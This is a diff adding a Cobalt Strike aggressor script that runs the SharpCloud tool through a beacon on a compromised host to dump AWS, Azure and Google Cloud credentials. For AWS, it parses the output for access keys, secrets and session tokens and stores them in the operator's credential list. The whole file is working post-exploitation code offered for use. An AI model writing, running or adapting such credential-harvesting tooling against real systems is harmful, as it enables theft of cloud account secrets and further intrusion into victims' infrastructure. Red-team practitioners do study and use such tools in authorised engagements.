@@ -1,0 +1,40 @@
+alias dump_aws {
+    # Execute SharpCloud with the "aws" option
+	bexecute_assembly($1, script_resource("SharpCloud.exe"), "aws");
+    # Once beacon receives output, find any AWS creds
+    on beacon_output {
+        # Split SharpCloud's output by newlines for iteration
+        @data = split("\n",$2);
+        $counter = 0;
+        foreach $line (@data)
+        {
+            # Find the line that denotes the beginning of new AWS creds
+            if ($line hasmatch 'aws_access_key_id.')
+            {
+                # The counter helps if multiple AWS creds are returned for one user
+                # We can detect the beginning of one and use the counter to grab the data
+                $aws_profile = replace(@data[$counter - 1], '\[', "");
+                $aws_profile = "AWS Profile: " . replace($aws_profile, '\]', "");
+                $aws_key = replace(split("=", $line)[1], " ", "");
+                $aws_secret = replace(split("=", @data[$counter + 1])[1], " ", "");
+                # Not all creds will have or need tokens, so check for that and then adcreds to beacon's credential model
+                if (@data[$counter + 2] hasmatch 'aws_session_token.')
+                {
+                    $aws_token = replace(split("=", @data[$counter + 2])[1], " ", "");
+                    credential_add($aws_key,"Secret: " . $aws_secret . ", Token: " . $aws_token, "AWS", $aws_profile, beacon_info($1, "computer"));
+                } else {
+                    credential_add($aws_key,"Secret: " . $aws_secret, "AWS", $aws_profile, beacon_info($1, "computer"));
+                }
+            }
+            $counter++;
+        }
+    }
+}
+
+alias dump_azure {
+	bexecute_assembly($1, script_resource("SharpCloud.exe"), "azure");
+}
+
+alias dump_gcloud {
+	bexecute_assembly($1, script_resource("SharpCloud.exe"), "gcloud");
+}
